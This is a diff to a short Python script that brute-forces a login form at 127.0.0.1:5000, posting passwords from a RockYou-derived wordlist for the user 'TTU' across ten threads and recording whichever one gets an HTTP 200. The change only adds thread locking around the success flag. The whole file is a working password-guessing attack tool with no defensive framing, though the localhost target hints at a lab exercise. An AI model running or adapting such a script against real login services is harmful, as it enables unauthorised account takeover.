@@ -1,27 +1,33 @@
 import requests
 import time
+import threading
 from concurrent.futures import ThreadPoolExecutor
 
 URL = "http://127.0.0.1:5000/login"
 WORDLIST_PATH = "short_rock_you.txt"
 THREADS = 10  # Number of simultaneous requests
 FOUND = False
+FOUND_PASSWORD = None
 
 # Use a session for connection pooling
 session = requests.Session()
+lock = threading.Lock()
 
 def attempt_password(password):
-    global FOUND
-    if FOUND:
-        return
+    global FOUND, FOUND_PASSWORD
+    with lock:
+        if FOUND:
+            return
 
     payload = {"username": "TTU", "password": password}
     
     try:
         response = session.post(URL, json=payload, timeout=5)
         if response.status_code == 200:
+            with lock:
+                FOUND = True
+                FOUND_PASSWORD = password
             print(f"\n[+] SUCCESS! Password found: {password}")
-            FOUND = True
     except Exception:
         pass
 
